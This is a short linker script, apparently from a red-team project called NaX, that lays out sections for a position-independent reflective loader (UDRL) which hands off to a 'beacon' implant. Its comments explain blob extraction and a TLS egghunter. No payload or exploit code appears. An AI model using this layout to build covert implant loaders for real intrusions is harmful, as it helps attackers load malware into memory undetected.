/* NaX src_loader/scripts/Linker.ld
 * Stardust linker script adapted for the NAX UDRL.
 *
 * Section ordering (CRITICAL):
 *   .text$A  - ASM entry stubs  (Start, StRipStart)
 *   .text$B  - C loader body    (PreMain, Main, Ldr, Utils)
 *   .rdata*  - read-only string literals / GCC ident strings
 *   .data*   - GCC-emitted WCHAR initialiser copies for local arrays;
 *              -Os lifts compound initializers to .data → must be here
 *              or RIP-relative refs land in zero memory at runtime.
 *   .text$E  - StRipEnd stub             (MUST be last - its return value
 *              equals the loader end address = beacon start in the blob)
 *
 * No .global section - INSTANCE pointer is stored via TLS egghunter
 * (consecutive slots with NtCurrentPeb() egg). No ALIGN(0x1000) needed.
 *
 * No .text$P ("STARDUST-END" marker) - build.py is not used.
 * objcopy --dump-section .text extracts the complete blob; StRipEnd's
 * `add rax, 0x0a` is calibrated for this exact 15-byte .text$E section. */

LINK_BASE = 0x0000;

ENTRY( Start )

SECTIONS
{
    . = LINK_BASE;
    .text : {
        . = LINK_BASE;
        *( .text$A );
        *( .text$B );
        *( .rdata* );
        *( .data* );
        *( .text$E );
    }

    .eh_frame : {
        *( .eh_frame )
    }
}
